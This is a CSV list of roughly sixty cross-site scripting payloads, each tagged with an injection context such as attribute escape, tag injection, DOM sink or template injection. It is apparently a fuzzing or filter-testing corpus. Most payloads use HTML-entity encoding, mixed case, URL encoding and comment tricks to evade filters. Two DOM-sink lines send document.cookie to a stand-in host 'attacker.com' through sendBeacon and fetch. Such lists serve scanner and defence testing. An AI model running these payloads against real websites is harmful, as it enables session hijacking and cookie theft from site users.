payload,context
"'><img src=x onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<script>Function('confirm(location.hash)')();</script>,script_injection
""" ><svg onbeforematch=prompt(String.fromCharCode(88,83,83))>",attribute_escape
' ><svg on&#101;rror=&#97;l&#101;rt(1)>,attribute_escape
j&#97;v&#97;script:confirm/***/('XSS'),js_uri
"WinDow[""aLerT""](naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink
<area/onpointercancel=console.log(document.domain)>,tag_injection
<ifRamE oNseCurItyPolIcyVioLatIon=coNfiRm('XSS')>,tag_injection
'%3E%3Cimg src=x ondragstart=console.log(location.hash)%3E,attribute_escape
\' onbeforecut=alert(document.domain)//,attribute_escape
"location=""javascript:fetch(String.fromCharCode(88,83,83))""",dom_sink
"onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt/***/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"<&#101;mb&#101;d
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
{{constructor.constructor('confirm('XSS')')()}},template_injection
onpopstate=confirm/*x*/(%27XSS%27),event_handler
"OnkEydOwn=prOmpT/***/(StRinG.fRomChaRCoDe(88,83,83))",event_handler
&quot; ontouchmove=confirm(%27XSS%27) x=&quot;,attribute_escape
"<form
ong&#101;stur&#101;st&#97;rt=consol&#101;.log('XSS')>",tag_injection
"""><plaintext ontouchstart=alert(1)>",tag_injection
"""><img src=x onpageswap=alert(document.domain)>",attribute_escape
'%3E%3Cimg src=x onfocus=console.log(1)%3E,attribute_escape
\' ontransitionend=alert(1)//,attribute_escape
"""><TabLe OnsEleCt=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
onscrollend=\u0061lert/***/('XSS'),event_handler
<video x=y ondragstart=alert(%27XSS%27)>,tag_injection
"SetTimEouT(""ConSolE.lOg(BtoA(dOcuMenT.cOokIe))"",0)",dom_sink
[#alert document.domain /],template_injection
'%3E%3Cimg src=x onbeforetoggle=alert(location.hash)%3E,attribute_escape
<link onw&#97;iting=confirm(1) onw&#97;iting=confirm(1)>,tag_injection
 onkeydown=confirm(1),event_handler
' ><svg onclos&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
document.body.innerHTML=%22<img src=x onerror=alert(1)>%22,dom_sink
	onclose=console.log('XSS'),event_handler
"setTimeout(%22eval(document.domain)%22,0)",dom_sink
' onwh&#101;&#101;l=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
document.querySelector(%22body%22).innerHTML+=%22console.log(%27XSS%27)%22,dom_sink
`%3E%3Cimg src=x onfocus=prompt(location.hash)%3E,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=fEtcH('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)>"")",dom_sink
${prompt?new()('document.domain')},template_injection
<teMplAte srC=x onEndEd=ProMpt('XSS')>,tag_injection
ondrop=confirm(docum&#101;nt.dom&#97;in),event_handler
"%3Cscript%3E//alert(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"\"" OnsEleCt=ProMpt(1)//",attribute_escape
OnfOcuSin=coNfiRm&#40;doCumEnt.doMaiN&#41;,event_handler
onselect=prompt/***/(location.hash),event_handler
""" ><svg onpageswap=\u0061lert(document.domain)>",attribute_escape
"""><script onpointerrawupdate=console.log(document.domain)>",tag_injection
<foRm OnrEseT=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
%22><img src=x onplaying=alert(location.hash)>,attribute_escape
"<a
OnbEfoRemAtcH=pRomPt(DocUmeNt.DomAin)>",tag_injection
"setTimeout(""eval(document.domain)"",0)",dom_sink
<script>Function('\u0061lert(document.domain)')();</script>,script_injection
	onWebKitFulLscReeNchAngE=pRomPt('XSS'),event_handler
' oNkeYprEss=alErt('XSS') ',attribute_escape
"s&#101;tInt&#101;rv&#97;l(""prompt(docum&#101;nt.cooki&#101;)"",100)",dom_sink
"window[""f&#101;tch""](String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
%3Cscript%3Ewindow['alert']('XSS')%3C/script%3E,script_injection
"""><TemPlaTe OneNdeD=pRomPt('XSS')>",tag_injection
	onDraGovEr=ConFirM(lOcaTioN.hAsh),event_handler
${confirm?n&#101;w()('1')},template_injection
\%27 onanimationiteration=console.log(document.domain)//,attribute_escape
